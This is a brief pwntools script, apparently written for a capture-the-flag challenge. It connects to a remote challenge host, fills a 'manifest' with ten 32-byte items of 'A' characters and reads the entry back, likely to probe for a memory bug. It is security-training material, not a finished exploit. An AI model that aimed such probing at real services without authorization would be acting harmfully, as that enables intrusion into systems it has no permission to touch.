from pwn import *

p = remote("kubenode.mctf.io", 31098)

def recv_menu():
    return p.recvuntil(b'> ')

recv_menu()
p.sendline(b'1')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'0')
p.recvuntil(b'Item count: ')
p.sendline(b'10')
p.recvuntil(b'Item size (bytes): ')
p.sendline(b'32')
p.recvuntil(b'data:\n')
p.send(b'A' * 320)
recv_menu()

p.sendline(b'3')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'0')
print(p.recv(1024, timeout=2).decode())

p.close()
